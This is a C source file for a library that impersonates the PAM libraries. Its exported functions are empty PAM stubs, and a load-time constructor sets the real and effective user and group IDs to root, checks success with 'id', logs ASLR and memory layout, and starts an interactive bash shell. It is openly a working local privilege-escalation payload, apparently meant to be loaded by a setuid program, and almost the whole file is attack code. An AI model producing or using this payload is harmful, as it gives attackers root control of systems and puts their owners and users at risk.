#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/auxvec.h>
#include "logging.h"

#define ID_PATH "/usr/bin/id"
#define SH_PATH "/bin/bash"

#define MAX_LINE_LENGTH 256

const char *auxvec_num_to_name[52] =
{
    "AT_NULL",          /* 0 => end of vector */
    "AT_IGNORE",        /* 1 => entry should be ignored */
    "AT_EXECFD",        /* 2 => file descriptor of program */
    "AT_PHDR",          /* 3 => program headers for program */
    "AT_PHENT",         /* 4 => size of program header entry */
    "AT_PHNUM",         /* 5 => number of program headers */
    "AT_PAGESZ",        /* 6 => system page size */
    "AT_BASE",          /* 7 => base address of interpreter */
    "AT_FLAGS",         /* 8 => flags */
    "AT_ENTRY",         /* 9 => entry point of program */
    "AT_NOTELF",        /* 10 => program is not ELF */
    "AT_UID",           /* 11 => real uid */
    "AT_EUID",          /* 12 =>effective uid */
    "AT_GID",           /* 13 => real gid */
    "AT_EGID",          /* 14 => effective gid */
    "AT_PLATFORM",      /* 15 => string identifying CPU for optimizations */
    "AT_HWCAP",         /* 16 => arch dependent hints at CPU capabilities */
    "AT_CLKTCK",        /* 17 => frequency at which times() increments */
    "", "", "", "", "", /* 18 => 18 - 22 are reserved */
    "AT_SECURE",        /* 23 => secure mode boolean */
    "AT_BASE_PLATFORM", /* 24 => string identifying real platform */
    "AT_RANDOM",        /* 25 => address of 16 random bytes */
    "AT_HWCAP2",        /* 26 => extension of AT_HWCAP */
    "AT_RSEQ_FEATURE_SIZE", /* 27 => rseq supported feature size */
    "AT_RSEQ_ALIGN",    /* 28 => rseq allocation alignment */
    "AT_HWCAP3",        /* 29 => extension of AT_HWCAP */
    "AT_HWCAP4",        /* 30 => extension of AT_HWCAP */
    "AT_EXECFN",        /* 31	=> filename of program */
    "AT_SYSINFO",       /* 32 => ... */
    "AT_SYSINFO_EHDR",  /* 33 => ... */
    "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
    "AT_MINSIGSTKSZ",   /* 51 => minimal stack size for signal delivery */
};

struct memory_region {
    unsigned long start_addr;
    unsigned long end_addr;
    char *name;
};

static int parse_maps_line(char *line, struct memory_region *region)
{
    char perms[16];
    unsigned long offset;
    char dev[16];
    unsigned long inode;
    char path[MAX_LINE_LENGTH] = {0};

    if (sscanf(line, "%lx-%lx %s %lx %s %lu %[^\n]",
                &region->start_addr,
                &region->end_addr,
                perms,
                &offset,
                dev,
                &inode,
                path) < 6) {
        return 0;
    }

    region->name = strdup(path[0] ? path : "anonymous");
    return 1;
}

static int get_aslr_info(int argc, char *argv[], char *envp[])
{
    int i;
    char **env_item;
    unsigned long *elf_info_item;
    size_t sz;
    FILE *maps_file;
    char line[MAX_LINE_LENGTH];
    struct memory_region region;

    unsigned long exec_start  = 0;
    unsigned long exec_end    = 0;
    unsigned long heap_start  = 0;
    unsigned long heap_end    = 0;
    unsigned long stack_start = 0;
    unsigned long stack_end   = 0;
    unsigned long libc_start  = 0;
    unsigned long libc_end    = 0;

    log("Running program: %s\n", argv[0]);

    maps_file = fopen("/proc/self/maps", "r");
    if (!maps_file)
        handle_error("fopen(/proc/self/maps)");

    while (fgets(line, sizeof(line), maps_file)) {
        if (parse_maps_line(line, &region)) {
            /* Detect executable base */
            if (strstr(region.name, "a.out") || 
                strstr(region.name, "read_aslr")) {
                if (exec_start == 0) {
                    exec_start = region.start_addr;
                }
                if (exec_end < region.end_addr) {
                    exec_end = region.end_addr;
                }
            }

            /* Detect heap start */
            if (strcmp(region.name, "[heap]") == 0) {
                heap_start = region.start_addr;
                heap_end   = region.end_addr;
            }

            /* Detect stack start */
            if (strcmp(region.name, "[stack]") == 0) {
                stack_start = region.start_addr;
                stack_end   = region.end_addr;
            }

            /* Detect libc base address */
            if (strstr(region.name, "libc.so")) {
                if (libc_start == 0 || region.start_addr < libc_start) {
                    libc_start = region.start_addr;
                }
                if (libc_end < region.end_addr) {
                    libc_end = region.end_addr;
                }
            }

            free(region.name);
        }
    }

    fclose(maps_file);

    log("Executable region:  [0x%lx - 0x%lx]\n", exec_start, exec_end);
    log("Libc region:        [0x%lx - 0x%lx]\n", libc_start, libc_end);
    log("Heap region:        [0x%lx - 0x%lx]\n", heap_start, heap_end);
    log("Stack region:       [0x%lx - 0x%lx]\n", stack_start, stack_end);

    /* Print argument details */
    slog("  ========== argv ==========\n");
    sz = 0;
    for (i = 0; i < argc; i++) {
        slog("  &argv[%2d] = %p => %p\n", i, &argv[i], argv[i]);
        slog("         ** = '%s' (%zuB)\n", argv[i], strlen(argv[i]) + 1);
        sz += (strlen(argv[i]) + 1);
    }
    slog("  --------------------------\n");
    slog("  Total count = %i\n", argc);
    slog("  Total size  = %zuB\n", sz);
    slog("\n");

    /* Print environment details */
    slog("  ========== envp ==========\n");
    sz = i = 0;
    env_item = envp;
    while (*env_item != NULL) {
        slog("  &envp[%2d] = %p => %p\n", i, env_item, *env_item);
        slog("         ** = '%s' (%zuB)\n", *env_item, strlen(*env_item) + 1);
        sz += (strlen(*env_item) + 1);
        env_item++;
        i++;
    }
    slog("  --------------------------\n");
    slog("  Total count = %i\n", i);
    slog("  Total size  = %zuB\n", sz);
    slog("\n");

    /* Print elf_info details */
    slog("  ======== elf_info ========\n");

    /* Continue reading from after the env vars */
    elf_info_item = (unsigned long *)env_item;
    while (*elf_info_item == 0)
        elf_info_item++;

    i = 0;
    while (*elf_info_item != 0) {
        slog("  &elf_info[%2d] = %p => {%s, 0x%lx}\n",
                i, elf_info_item, auxvec_num_to_name[*elf_info_item],
                *(elf_info_item + 1));
        elf_info_item += 2;
        i += 2;
    }
    slog("  --------------------------\n");
    slog("  Total count = %i\n", i / 2);
    slog("  Total size  = %zuB\n", i * sizeof(*elf_info_item));

    return 0;
}

/*
 * This library replaces both pam and pam_misc. Make
 * sure to only drop the shell once.
 */
int shell_done = 0;

__attribute__((constructor))
void drop_shell(int argc, char *argv[], char *envp[])
{
    int rc; /* return code */

    if (shell_done) {
        warn("Shell already dropped!\n");
        return;
    }
    shell_done = 1;

    rc = setresuid(0, 0, 0);
    rc |= setresgid(0, 0, 0);
    if (rc != 0)
        handle_error("setresuid()");

    /* Run `id` to ensure we achieved root */
    log("Ensure root credentials after successful attack:\n");
    system(ID_PATH);

    /* Get ASLR information */
    get_aslr_info(argc, argv, envp);

    /* Execute interactive bash */
    log("Dropping to shell!");
    system(SH_PATH);

    /* All done! :) */
    _exit(EXIT_SUCCESS);
}

#define FAKE_FUCTION(x, y) \
    __attribute__((version(y))) int x() { return 0; }

FAKE_FUCTION(pam_start, "PAM_1.0")
FAKE_FUCTION(pam_set_item, "PAM_1.0")
FAKE_FUCTION(pam_chauthtok, "PAM_1.0")
FAKE_FUCTION(pam_end, "PAM_1.0")
FAKE_FUCTION(pam_strerror, "PAM_1.0")
FAKE_FUCTION(pam_getenvlist, "PAM_1.0")
FAKE_FUCTION(pam_close_session, "PAM_1.0")
FAKE_FUCTION(pam_acct_mgmt, "PAM_1.0")
FAKE_FUCTION(pam_setcred, "PAM_1.0")
FAKE_FUCTION(pam_authenticate, "PAM_1.0")
FAKE_FUCTION(pam_open_session, "PAM_1.0")
FAKE_FUCTION(misc_conv, "LIBPAM_MISC_1.0")
